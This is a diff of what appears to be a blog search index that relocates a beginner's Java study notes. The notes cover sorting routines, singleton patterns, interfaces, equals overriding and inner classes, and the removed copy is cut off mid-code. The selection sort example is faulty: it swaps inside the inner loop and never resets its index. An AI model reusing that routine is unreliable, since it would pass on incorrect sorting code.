@@ -78,6 +78,69 @@
       </tags>
   </entry>
   <entry>
+    <title>JavaWeb基础学习笔记</title>
+    <url>/2024/03/19/JavaWeb%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>
+
+<h1 id="查看变量的类型"><a href="#查看变量的类型" class="headerlink" title="查看变量的类型"></a>查看变量的类型</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查看变量类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">typeof</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o.getClass().toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="冒泡排序和选择排序和快速排序的实现"><a href="#冒泡排序和选择排序和快速排序的实现" class="headerlink" title="冒泡排序和选择排序和快速排序的实现"></a>冒泡排序和选择排序和快速排序的实现</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//冒泡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Bubble</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    	<span class="type">int</span> i,j,temp;</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;a.length;j++)&#123;</span><br><span class="line">    			<span class="keyword">if</span>(a[i]&gt;a[j])&#123;</span><br><span class="line">    				temp = a[i];</span><br><span class="line">    				a[i] = a[j];</span><br><span class="line">    				a[j] = temp;</span><br><span class="line">    			&#125;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//选择</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Select</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    	<span class="type">int</span> i,j,max,temp,x=<span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">       		max = a[i];</span><br><span class="line">    		<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;a.length;j++)&#123;</span><br><span class="line">    			<span class="keyword">if</span>(max&lt;a[j])&#123;</span><br><span class="line">    				max = a[j];</span><br><span class="line">    				x=j;</span><br><span class="line">    			&#125;</span><br><span class="line">    			temp = a[i];</span><br><span class="line">    			a[i] = a[x];</span><br><span class="line">    			a[x] = temp;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//快排</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">qsort</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> s,<span class="type">int</span> f)</span>&#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> f;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (s+f)/<span class="number">2</span>;</span><br><span class="line">    	<span class="type">int</span> temp;</span><br><span class="line">    	<span class="keyword">do</span>&#123;</span><br><span class="line">    		<span class="keyword">while</span>(a[j]&gt;a[mid]) j--;</span><br><span class="line">    		<span class="keyword">while</span>(a[i]&lt;a[mid]) i++;</span><br><span class="line">    		</span><br><span class="line">    		<span class="keyword">if</span>(i&lt;=j)&#123;</span><br><span class="line">    			temp = a[j];</span><br><span class="line">    			a[j] = a[i];</span><br><span class="line">    			a[i] = temp;</span><br><span class="line">    			i++;</span><br><span class="line">    			j--;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;<span class="keyword">while</span>(i&lt;=j);</span><br><span class="line">    	<span class="keyword">if</span>(i&lt;f) qsort(a,i,f);</span><br><span class="line">    	<span class="keyword">if</span>(s&lt;j) qsort(a,s,j);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Arrays类的小应用"><a href="#Arrays类的小应用" class="headerlink" title="Arrays类的小应用"></a>Arrays类的小应用</h1><p>先把二维数组[使用System.arraycopy进行数组复制到一个一维数组<br>然后使用sort进行排序<br>最后再复制回到二维数组</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="comment">//Select(a);</span></span><br><span class="line">    	<span class="comment">//Bubble(a);</span></span><br><span class="line">    	<span class="type">int</span> a[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">    	<span class="type">int</span> b[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">9</span>];</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">    			a[i][j]=(<span class="type">int</span>)(Math.random()*<span class="number">100</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		System.arraycopy(a[i], <span class="number">0</span>, b, i*<span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	</span><br><span class="line">    	Arrays.sort(b);</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		System.arraycopy(b, i*<span class="number">3</span>, a[i], <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">    			System.out.println(a[i][j]);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="给方法传递一个引用数组"><a href="#给方法传递一个引用数组" class="headerlink" title="给方法传递一个引用数组"></a>给方法传递一个引用数组</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> j2se;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ADHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero ... heros)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;heros.length;i++)&#123;</span><br><span class="line">			System.out.println(heros[<span class="number">0</span>].name+<span class="string">&quot;攻击了&quot;</span>+heros[i].name+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">chaospeo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">orxiain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">boogipop</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		ewoji.name = <span class="string">&quot;ewoji&quot;</span>;</span><br><span class="line">		chaospeo.name= <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">		orxiain.name = <span class="string">&quot;orxianin&quot;</span>;</span><br><span class="line">		boogipop.name = <span class="string">&quot;boogipop&quot;</span>;</span><br><span class="line">		</span><br><span class="line">		ewoji.attack(ewoji,chaospeo,orxiain,boogipop);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="饿汉式单例模式"><a href="#饿汉式单例模式" class="headerlink" title="饿汉式单例模式"></a>饿汉式单例模式</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GiantDragon</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;龙王&quot;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">double</span> <span class="variable">hp</span> <span class="operator">=</span> <span class="number">1000.0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="type">double</span> <span class="variable">Armor</span> <span class="operator">=</span> <span class="number">100.0</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GiantDragon</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//----------------------------------------------------//</span></span><br><span class="line">	<span class="comment">//----------------------------------------------------//</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">GiantDragon</span> <span class="variable">one</span> <span class="operator">=</span> GiantDragon.getDragon();</span><br><span class="line">		System.out.println(one.name+one.hp+one.Armor);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的GiantDragon instance和getDragon()必修都要用static修饰</p>
+<p>前者是为了在不实例化的情况下就把唯一的大龙对象实例化</p>
+<p>后者是为了在不实例化的情况下直接访问这个方法</p>
+<h1 id="懒汉式单例模式"><a href="#懒汉式单例模式" class="headerlink" title="懒汉式单例模式"></a>懒汉式单例模式</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">GiantDragon</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> GiantDragon instance;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> GiantDragon <span class="title function_">getDragon</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="literal">null</span>==instance)&#123;</span><br><span class="line">			instance = <span class="keyword">new</span> <span class="title class_">GiantDragon</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和饿汉式的区别是，它不会直接加载这个实例instance，而是当你调用getDragon()的时候才会创造这个实例</p>
+<h1 id="利用接口实现类的多态"><a href="#利用接口实现类的多态" class="headerlink" title="利用接口实现类的多态"></a>利用接口实现类的多态</h1><p>Motal接口</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Mortal</span> &#123;</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数的重写</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">APHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span> <span class="keyword">implements</span> <span class="title class_">AP</span>,Mortal &#123;</span><br><span class="line">	<span class="comment">//法术平A</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">magicAttack</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;法术平A&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//死</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">die</span><span class="params">()</span>&#123;</span><br><span class="line">		System.out.println(<span class="built_in">this</span>.name+<span class="string">&quot;死亡&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//杀</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">kill</span><span class="params">(Mortal m)</span>&#123;</span><br><span class="line">    	m.die();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Hero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        <span class="type">ADHero</span> <span class="variable">go</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">        go.name = <span class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">        ewoji.kill(go);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里传入的是一个接口</p>
+<h1 id="子类使用父类的带参初始化方法"><a href="#子类使用父类的带参初始化方法" class="headerlink" title="子类使用父类的带参初始化方法"></a>子类使用父类的带参初始化方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">APHero</span><span class="params">(String name,<span class="type">double</span> hp)</span>&#123;</span><br><span class="line">		<span class="built_in">super</span>(name,hp);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="重写equals比较两个对象内容是否相等"><a href="#重写equals比较两个对象内容是否相等" class="headerlink" title="重写equals比较两个对象内容是否相等"></a>重写equals比较两个对象内容是否相等</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> charactor;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hero</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">float</span> hp;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Hero)&#123;</span><br><span class="line">            <span class="type">Hero</span> <span class="variable">h</span> <span class="operator">=</span> (Hero) o;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.hp == h.hp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Hero h1= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h1.hp = <span class="number">300</span>;</span><br><span class="line">        Hero h2= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h2.hp = <span class="number">400</span>;</span><br><span class="line">        Hero h3= <span class="keyword">new</span> <span class="title class_">Hero</span>();</span><br><span class="line">        h3.hp = <span class="number">300</span>;</span><br><span class="line">         </span><br><span class="line">        System.out.println(h1.equals(h2));</span><br><span class="line">        System.out.println(h1.equals(h3));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果不重写的话，Object的只会比较两个对象的引用是否指向一个对象</p>
+<h1 id="利用非静态内部类和静态内部类服务外部类"><a href="#利用非静态内部类和静态内部类服务外部类" class="headerlink" title="利用非静态内部类和静态内部类服务外部类"></a>利用非静态内部类和静态内部类服务外部类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分数类,非静态，可访问外部类变量</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">BattleScore</span>&#123;</span><br><span class="line">    	<span class="type">int</span> kill;</span><br><span class="line">    	<span class="type">int</span> die;</span><br><span class="line">    	<span class="type">int</span> assit;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">legendary</span><span class="params">()</span>&#123;</span><br><span class="line">    		<span class="keyword">if</span>(kill &gt; <span class="number">8</span>)</span><br><span class="line">    			System.out.println(name+<span class="string">&quot;超神！&quot;</span>);</span><br><span class="line">    		<span class="keyword">else</span></span><br><span class="line">    			System.out.println(name+<span class="string">&quot;尚未超神&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//水晶类,静态,不可访问外部类变量</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EnemyCrystal</span>&#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">hp</span> <span class="operator">=</span> <span class="number">5000</span>;</span><br><span class="line">    	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkIfVictory</span><span class="params">()</span>&#123;</span><br><span class="line">    		<span class="keyword">if</span>(hp==<span class="number">0</span>)&#123;</span><br><span class="line">    			Hero.battleWin();</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="转换为字符串的两种方法"><a href="#转换为字符串的两种方法" class="headerlink" title="转换为字符串的两种方法"></a>转换为字符串的两种方法</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//使用String类的静态方法valueOf()转化</span><br><span class="line">		int go = 222222;</span><br><span class="line">		String str = String.valueOf(go);</span><br><span class="line"></span><br><span class="line">		//使用Obeject类的方法toString()转化</span><br><span class="line">		Integer it = go;</span><br><span class="line">		String go1 = it.toString();</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JavaWeb中级学习笔记</title>
+    <url>/2024/03/22/JavaWeb%E4%B8%AD%E7%BA%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>
+
+]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP特性ctfshow</title>
     <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
     <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
@@ -176,69 +239,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JavaWeb中级学习笔记</title>
-    <url>/2024/03/22/JavaWeb%E4%B8%AD%E7%BA%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>
-
-]]></content>
-      <tags>
-        <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JavaWeb基础学习笔记</title>
-    <url>/2024/03/19/JavaWeb%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="记录一些学习中自己写的一些实例"><a href="#记录一些学习中自己写的一些实例" class="headerlink" title="记录一些学习中自己写的一些实例"></a>记录一些学习中自己写的一些实例</h2><span id="more"></span>
-
-<h1 id="查看变量的类型"><a href="#查看变量的类型" class="headerlink" title="查看变量的类型"></a>查看变量的类型</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查看变量类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">typeof</span><span class="params">(Object o)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o.getClass().toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="冒泡排序和选择排序和快速排序的实现"><a href="#冒泡排序和选择排序和快速排序的实现" class="headerlink" title="冒泡排序和选择排序和快速排序的实现"></a>冒泡排序和选择排序和快速排序的实现</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//冒泡</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Bubble</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    	<span class="type">int</span> i,j,temp;</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;a.length;j++)&#123;</span><br><span class="line">    			<span class="keyword">if</span>(a[i]&gt;a[j])&#123;</span><br><span class="line">    				temp = a[i];</span><br><span class="line">    				a[i] = a[j];</span><br><span class="line">    				a[j] = temp;</span><br><span class="line">    			&#125;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//选择</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Select</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line">    	<span class="type">int</span> i,j,max,temp,x=<span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;a.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">       		max = a[i];</span><br><span class="line">    		<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;a.length;j++)&#123;</span><br><span class="line">    			<span class="keyword">if</span>(max&lt;a[j])&#123;</span><br><span class="line">    				max = a[j];</span><br><span class="line">    				x=j;</span><br><span class="line">    			&#125;</span><br><span class="line">    			temp = a[i];</span><br><span class="line">    			a[i] = a[x];</span><br><span class="line">    			a[x] = temp;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//快排</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">qsort</span><span class="params">(<span class="type">int</span> a[],<span class="type">int</span> s,<span class="type">int</span> f)</span>&#123;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> f;</span><br><span class="line">    	<span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (s+f)/<span class="number">2</span>;</span><br><span class="line">    	<span class="type">int</span> temp;</span><br><span class="line">    	<span class="keyword">do</span>&#123;</span><br><span class="line">    		<span class="keyword">while</span>(a[j]&gt;a[mid]) j--;</span><br><span class="line">    		<span class="keyword">while</span>(a[i]&lt;a[mid]) i++;</span><br><span class="line">    		</span><br><span class="line">    		<span class="keyword">if</span>(i&lt;=j)&#123;</span><br><span class="line">    			temp = a[j];</span><br><span class="line">    			a[j] = a[i];</span><br><span class="line">    			a[i] = temp;</span><br><span class="line">    			i++;</span><br><span class="line">    			j--;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;<span class="keyword">while</span>(i&lt;=j);</span><br><span class="line">    	<span class="keyword">if</span>(i&lt;f) qsort(a,i,f);</span><br><span class="line">    	<span class="keyword">if</span>(s&lt;j) qsort(a,s,j);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Arrays类的小应用"><a href="#Arrays类的小应用" class="headerlink" title="Arrays类的小应用"></a>Arrays类的小应用</h1><p>先把二维数组[使用System.arraycopy进行数组复制到一个一维数组<br>然后使用sort进行排序<br>最后再复制回到二维数组</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    	<span class="comment">//Select(a);</span></span><br><span class="line">    	<span class="comment">//Bubble(a);</span></span><br><span class="line">    	<span class="type">int</span> a[][] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">    	<span class="type">int</span> b[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">9</span>];</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">    			a[i][j]=(<span class="type">int</span>)(Math.random()*<span class="number">100</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		System.arraycopy(a[i], <span class="number">0</span>, b, i*<span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	</span><br><span class="line">    	Arrays.sort(b);</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		System.arraycopy(b, i*<span class="number">3</span>, a[i], <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)&#123;</span><br><span class="line">    			System.out.println(a[i][j]);</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="给方法传递一个引用数组"><a href="#给方法传递一个引用数组" class="headerlink" title="给方法传递一个引用数组"></a>给方法传递一个引用数组</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> j2se;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ADHero</span> <span class="keyword">extends</span> <span class="title class_">Hero</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Hero ... heros)</span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;heros.length;i++)&#123;</span><br><span class="line">			System.out.println(heros[<span class="number">0</span>].name+<span class="string">&quot;攻击了&quot;</span>+heros[i].name+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">ewoji</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		<span class="type">ADHero</span> <span class="variable">chaospeo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ADHero</span>();</span><br><span class="line">		